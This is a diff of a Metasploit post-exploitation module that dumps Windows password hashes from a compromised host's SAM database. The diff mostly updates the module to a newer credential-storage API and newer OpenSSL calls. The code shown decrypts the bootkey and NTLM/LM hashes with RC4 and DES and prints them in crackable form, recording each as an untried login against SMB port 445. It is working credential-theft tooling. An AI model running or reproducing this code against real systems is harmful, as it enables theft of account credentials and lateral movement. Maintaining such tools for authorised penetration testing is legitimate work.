@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -7,7 +7,7 @@ require 'msf/core'
 require 'rex'
 require 'msf/core/auxiliary/report'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
 
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::Priv
@@ -66,16 +66,47 @@ class Metasploit3 < Msf::Post
       print_status("Dumping password hashes...")
       print_line()
       print_line()
+
+      # Assemble the information about the SMB service for this host
+      service_data = {
+          address: ::Rex::Socket.getaddress(session.sock.peerhost, true),
+          port: 445,
+          service_name: 'smb',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id
+      }
+
+      # Assemble data about the credential objects we will be creating
+      credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          private_type: :ntlm_hash
+      }
+
+      # Merge the service data into the credential data
+      credential_data.merge!(service_data)
+
       users.keys.sort{|a,b| a<=>b}.each do |rid|
         hashstring = "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::"
-        report_auth_info(
-          :host  => session.sock.peerhost,
-          :port  => 445,
-          :sname => 'smb',
-          :user  => users[rid][:Name].downcase,
-          :pass  => users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0],
-          :type  => "smb_hash"
-        )
+
+        # Add the details for this specific credential
+        credential_data[:private_data] = users[rid][:hashlm].unpack("H*")[0] +":"+ users[rid][:hashnt].unpack("H*")[0]
+        credential_data[:username]     = users[rid][:Name].downcase
+
+        # Create the Metasploit::Credential::Core object
+        credential_core = create_credential(credential_data)
+
+        # Assemble the options hash for creating the Metasploit::Credential::Login object
+        login_data ={
+          core: credential_core,
+          status: Metasploit::Model::Login::Status::UNTRIED
+        }
+
+        # Merge in the service data and create our Login
+        login_data.merge!(service_data)
+        login = create_credential_login(login_data)
+
 
         print_line hashstring
       end
@@ -113,7 +144,7 @@ class Metasploit3 < Msf::Post
     hash = Digest::MD5.new
     hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
-    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
+    rc4 = OpenSSL::Cipher.new("rc4")
     rc4.key = hash.digest
     hbootkey  = rc4.update(vf[0x80, 32])
     hbootkey << rc4.final
@@ -226,18 +257,18 @@ class Metasploit3 < Msf::Post
 
     des_k1, des_k2 = rid_to_key(rid)
 
-    d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d1 = OpenSSL::Cipher.new('des-ecb')
     d1.padding = 0
     d1.key = des_k1
 
-    d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d2 = OpenSSL::Cipher.new('des-ecb')
     d2.padding = 0
     d2.key = des_k2
 
     md5 = Digest::MD5.new
     md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
 
-    rc4 = OpenSSL::Cipher::Cipher.new('rc4')
+    rc4 = OpenSSL::Cipher.new('rc4')
     rc4.key = md5.digest
     okey = rc4.update(enchash)
 
